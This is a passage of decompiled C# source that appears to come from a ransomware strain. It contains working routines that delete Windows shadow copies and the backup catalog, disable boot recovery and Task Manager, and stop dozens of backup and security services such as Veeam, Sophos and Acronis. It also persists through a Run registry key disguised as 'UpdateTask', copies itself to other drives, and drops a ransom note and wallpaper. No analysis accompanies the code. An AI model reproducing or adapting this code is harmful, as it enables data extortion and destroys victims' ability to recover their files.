		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
